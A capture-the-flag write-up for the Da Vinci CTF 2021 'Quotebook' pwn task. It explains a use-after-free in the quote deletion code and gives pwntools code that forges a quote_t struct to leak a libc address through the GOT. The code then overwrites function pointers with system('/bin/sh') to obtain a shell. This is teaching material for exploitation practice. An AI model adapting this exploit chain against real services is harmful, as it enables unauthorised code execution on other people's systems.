# Da Vinci CTF 2021 - Quotebook (499 pts)  
The subject of this task was:

>  
> I created this amazing service to store all my famous quotes. Can you get
> the flag?  
>  
> nc challs.dvc.tf 2222

We are given the binary, the source code for it and the libc used on the
server. We'll need to find a vuln into the binary to get a shell and grab a
flag from the server (typical pwn task).

## Source analysis

When looking at the source code, we can see that a quote is defined like this:  
```c  
typedef struct quote_t quote_t;  
struct quote_t  
{  
   char * content;  
   unsigned int content_size;  
   char * title;  
   unsigned int title_size;  
   void (*write)(quote_t *);  
   void (*read)(quote_t *);  
};  
```

and we have an array to store the quotes with a variable which indexes the
"current" quote:  
```c  
quote_t * book[NB_PAGE];  
unsigned int book_ctr;  
```

So, when a quote is created, a buffer of `sizeof(quote_t)` is allocated, then
the program asks the title and content size, to allocate buffers from the
given size. Then the title and contents are read from `stdin`.

The interesting things happen when freeing a quote:  
```c  
   int choice = get_choice("Quote number");  
   if(choice < 1 || choice >= book_ctr + 1)  
   {  
       puts("[!] Error : wrong quote number !");  
   }  
   else  
   {  
       free(book[choice - 1]);  
       book_ctr--;  
   }  
```

First of all, the buffers containing the title and quote are not freed (enjoy
ur memory leak), and even freed, the pointer is still present on the `book`
array, and the book_ctr is decremented (which is useless since you can control
which entry you want to free).  
So from there we can trigger an use-after-free vulnerability.

## Leaking libc address  
If we create a quote and destroy it afterwards, the `book` array still
contains the address of the freed buffer. This means that if we can control
program allocations, then we can write anything we want on that buffer, while
the program still believes it's a `quote_t` structure.

And remember, we can allocate buffers from the size we want while creating a
quote, and write what we want on it. And since we can list quotes:  
```c  
void quote_read(quote_t * quote)  
{  
   printf("[+] %s", quote->title);  
   printf("[>] %s", quote->content);  
}  
```  
, if `content` or `title` point to the binary's GOT section, then we can leak
a libc's function address, and then getting the libc base.

But we have to be careful, because `book_ctr` is decremented, if we only
create one quote and remove it, its pointer will be overwritten by the new
quote we create. So let's create 3 quotes, with buffers of size 1. The heap
will look like something like this:  
```  
-----------------------------------------------  
| first struct | second struct | third struct |  
-----------------------------------------------  
   book[0]        book[1]         book[2]  
```  
The small buffers we allocated are placed in another heap arena (since they
are 1 bytes long)

Now, we'll delete the first two structs, the heap will now look like this:  
```  
------------------------------------------------  
| freed chunk  |  freed chunk  |  third struct |  
------------------------------------------------  
   book[0]        book[1]         book[2]  
```

And this time we'll create a new quote (on `book[book_ctr]`), but with a
sizeof(quote) length, so the heap will look like this:  
```  
------------------------------------------------  
| book1 buffer |  freed chunk  |  third struct |  
------------------------------------------------  
   book[0]        book[1]         book[2]  
```  
We can clearly see that the freed chunk pointed by book[0] contains the
second's quote buffer, and we can craft a fake `quote_t` struct with program's
GOT  as title pointer.  
```python  
# Craft UAF with title overwriting first quote_t structure  
s.sendline("2")  
print(s.recvuntil('size > '))  
# title size  
s.sendline("1")  
print(s.recvuntil(' size > '))  
# content size  
s.sendline("48")  
s.recvuntil('Title > ')

PRINTF_ADDR = 0x404030  
RANDOM_BUF = 0x4040c0  
#### Craft structure to leak libc ###  
# Pack content and content size  
buf = pwn.pack(RANDOM_BUF, 64) + pwn.pack(1, 64)  
# Pack title addr and size (printf addr in PLT)  
buf += pwn.pack(PRINTF_ADDR, 64) + pwn.pack(8, 64)  
# Set function pointers  
buf += pwn.pack(0x401236, 64) + pwn.pack(0x401294, 64)

# Send title  
s.sendline("a")  
print(str(s.recv(), 'ascii'))

# Send content  
s.sendline(buf)  
print(str(s.recv(), 'ascii'))

# Display quote and trigger UAF  
s.recv()  
s.sendline("3")  
print(s.recv())  
s.sendline("1")  
s.recvline()  
leak = s.recvline() # quote contents contain printf addr  
```  
This way we can get the glibc's printf address, and compute system() address
by doing:  
```python  
leak = s.recvline()  
puts_leak = leak[4:4+6]  
addr = pwn.unpack(puts_leak, len(puts_leak)*8)  
libc_base = addr - libc.symbols["printf"]  
system_addr = libc_base + libc.symbols["system"]  
```

Now, let's get a shell !  
## Pwning the app and getting a shell  
Fortunately , the program allows us to edit a quote, this basically means
replacing the old buffer's content by something else. Also, the program
contains function pointers that we can overwrite to redirect to any address we
want since we can craft a whole quote_t structure.

The function pointers have this prototype:  
```c  
   void (*write)(quote_t *);  
   void (*read)(quote_t *);  
```  
So it would be nice to redirect the control flow to a function which takes one
argument, and luckily we have: `system(char *command)` to do this.

So to get a shell we need to:  
- put the `/bin/sh` string at the beginning of the buffer  
- put system address we got from the leak before at the `write` function pointer (since `read` gets overwritten because the programs insert a newline)  
- Edit the first quote (the crafted one) to call our function pointer  
- ???  
- PROFIT

```python  
# Edit the second quote so we can control first's quote buffer  
s.sendline("4")  
s.recv()  
s.sendline("2")  
# Craft our content buffer  
b = b"/bin/sh\x00" + pwn.pack(1, 64)  
# Padding to reach function pointers  
b += b"A"* 16  
b += pwn.pack(system_addr, 64) * 2  
s.sendline(b)  
s.recvuntil('Choice number > ')

# Edit the first quote to trigger system()  
s.sendline("4")  
s.recvuntil('Quote number > ')  
s.sendline("1")  
# Get the shell  
s.interactive()  
```

Original writeup
(https://github.com/ret2school/ctf/tree/master/2021/dvctf/pwn/quotebook).